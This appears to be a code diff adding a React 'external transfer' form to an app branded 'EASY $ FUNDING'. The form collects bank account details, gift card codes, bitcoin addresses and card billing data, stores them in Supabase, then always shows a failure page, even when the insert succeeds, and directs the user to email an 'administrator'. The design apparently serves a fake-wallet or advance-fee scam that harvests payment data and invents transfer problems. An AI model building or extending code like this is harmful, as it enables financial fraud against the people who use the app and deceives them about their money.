@@ -1,0 +1,223 @@
+import { useState, useEffect } from 'react';
+import { useTranslation } from 'react-i18next';
+import { supabase } from './supabase';
+
+export default function ExternalTransferForm({ session }) {
+  const [adminEmail, setAdminEmail] = useState('{adminEmail}');
+
+  useEffect(() => {
+    async function loadAdminEmail() {
+      const { data, error } = await supabase
+        .from('app_settings')
+        .select('administrator_email')
+        .eq('id', 'global')
+        .single();
+
+      if (!error && data?.administrator_email) {
+        setAdminEmail(data.administrator_email);
+      }
+    }
+
+    loadAdminEmail();
+  }, []);
+
+  const { t } = useTranslation();
+  const [type, setType] = useState('bank_transfer');
+  const [amount, setAmount] = useState('');
+  const [details, setDetails] = useState({});
+  const [busy, setBusy] = useState(false);
+  const [errorPage, setErrorPage] = useState(false);
+  const [notice, setNotice] = useState('');
+
+  const update = (key, value) =>
+    setDetails(previous => ({ ...previous, [key]: value }));
+
+  const field = (label, key, placeholder, required = true) => (
+    <label style={{ display: 'block', margin: '14px 0' }}>
+      {label}
+      <input
+        style={inputStyle}
+        value={details[key] || ''}
+        onChange={e => update(key, e.target.value)}
+        placeholder={placeholder}
+        required={required}
+      />
+    </label>
+  );
+
+  async function submit(e) {
+    e.preventDefault();
+    if (!session?.user?.id) {
+      setNotice('Please sign in first.');
+      return;
+    }
+
+    setBusy(true);
+    setNotice('');
+
+    const { error } = await supabase.from('transfer_requests').insert({
+      user_id: session.user.id,
+      transfer_type: type,
+      amount: Number(amount),
+      currency: 'USD',
+      details
+    });
+
+    setBusy(false);
+
+    if (error) {
+      setNotice('Your request could not be recorded. Please contact the administrator.');
+    }
+
+    setErrorPage(true);
+  }
+
+  if (errorPage) {
+    const subject = encodeURIComponent('EASY $ FUNDING - Transfer Assistance');
+    const body = encodeURIComponent(
+      `Hello Administrator,\n\nI need assistance with a ${type.replace('_', ' ')} request.\nAmount: $${amount}\nPlease assist me.\n\nThank you.`
+    );
+
+    return (
+      <section className="wallet-card" style={{ textAlign: 'center', padding: 24 }}>
+        <h2 style={{ color: '#d93025' }}>{t('transferWarning')}</h2>
+        <p>
+          {t('contactHelp')}
+        <p style={{ marginTop: 12, fontWeight: 'bold', color: '#174ea6' }}>
+          {t('administratorEmail')}: {adminEmail}
+        </p>
+        </p>
+        {notice && <p>{notice}</p>}
+        <a
+          href={`https://mail.google.com/mail/u/0/?view=cm&fs=1&to=${encodeURIComponent(adminEmail)}&su=${subject}&body=${body}`}
+          target="_blank"
+          rel="noopener noreferrer"
+          style={buttonStyle}
+        >
+          {t('contactAdmin')}
+        </a>
+        <button
+          style={{ ...buttonStyle, background: '#555', marginTop: 12 }}
+          onClick={() => {
+            setErrorPage(false);
+            setAmount('');
+            setDetails({});
+            setNotice('');
+          }}
+        >
+          {t('returnOptions')}
+        </button>
+      </section>
+    );
+  }
+
+  return (
+    <section className="wallet-card">
+      <h2>{t('externalServices')}</h2>
+      <p>{t('selectTransfer')}</p>
+
+      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10 }}>
+        {[
+  ['bank_transfer', t('bankTransfer')],
+  ['gift_card', t('giftCard')],
+  ['bitcoin', t('bitcoin')],
+  ['mastercard', t('mastercard')]
+].map(([value, label]) => (
+          <button
+            type="button"
+            key={value}
+            onClick={() => {
+              setType(value);
+              setDetails({});
+            }}
+            style={{
+              ...buttonStyle,
+              background: type === value ? '#174ea6' : '#444'
+            }}
+          >
+            {label}
+          </button>
+        ))}
+      </div>
+
+      <form onSubmit={submit}>
+        <label style={{ display: 'block', margin: '16px 0' }}>
+          {t('amount')}
+          <input
+            style={inputStyle}
+            type="number"
+            min="0.01"
+            step="0.01"
+            value={amount}
+            onChange={e => setAmount(e.target.value)}
+            placeholder={t('enterAmount')}
+            required
+          />
+        </label>
+
+        {type === 'bank_transfer' && <>
+          {field(t('bankName'), 'bank_name', t('enterBankName'))}
+          {field(t('accountName'), 'account_name', t('enterAccountName'))}
+          {field(t('accountNumberLabel'), 'account_number', t('enterAccountNumber'))}
+          {field(t('bankAddress'), 'bank_address', t('enterBankAddress'))}
+        </>}
+
+        {type === 'gift_card' && <>
+          {field(t('brand'), 'brand', t('giftBrandExample'))}
+          {field(t('cardType'), 'card_type', t('physicalDigital'))}
+          {field(t('giftCode'), 'gift_card_code', t('enterGiftCode'))}
+          {field(t('cardValue'), 'card_value', t('enterCardValue'))}
+        </>}
+
+        {type === 'bitcoin' && <>
+          {field(t('bitcoinAddress'), 'wallet_address', t('enterWalletAddress'))}
+          {field(t('network'), 'network', t('enterNetwork'))}
+          {field(t('reference'), 'reference', t('optionalReference'), false)}
+        </>}
+
+        {type === 'mastercard' && <>
+          {field(t('cardholder'), 'cardholder_name', 'Enter cardholder name')}
+          {field(t('lastFour'), 'last_four', 'Last four digits only', false)}
+          {field(t('billing'), 'billing_address', 'Enter billing address')}
+          {field(t('paymentReference'), 'payment_reference', 'Reference or token only', false)}
+          <p style={{ color: '#d93025', fontSize: 13 }}>
+            {t('neverShareCard')}
+          </p>
+        </>}
+
+        <button type="submit" disabled={busy} style={{ ...buttonStyle, marginTop: 16 }}>
+          {busy ? t('pleaseWait') : t('continue')}
+        </button>
+      </form>
+
+      {notice && <p role="alert">{notice}</p>}
+    </section>
+  );
+}
+
+const inputStyle = {
+  display: 'block',
+  width: '100%',
+  boxSizing: 'border-box',
+  padding: 12,
+  marginTop: 6,
+  borderRadius: 8,
+  border: '1px solid #999',
+  fontSize: 16
+};
+
+const buttonStyle = {
+  display: 'inline-block',
+  boxSizing: 'border-box',
+  width: '100%',
+  padding: 13,
+  border: 0,
+  borderRadius: 8,
+  background: '#174ea6',
+  color: 'white',
+  fontSize: 15,
+  fontWeight: 'bold',
+  textAlign: 'center',
+  textDecoration: 'none',
+  cursor: 'pointer'
+};
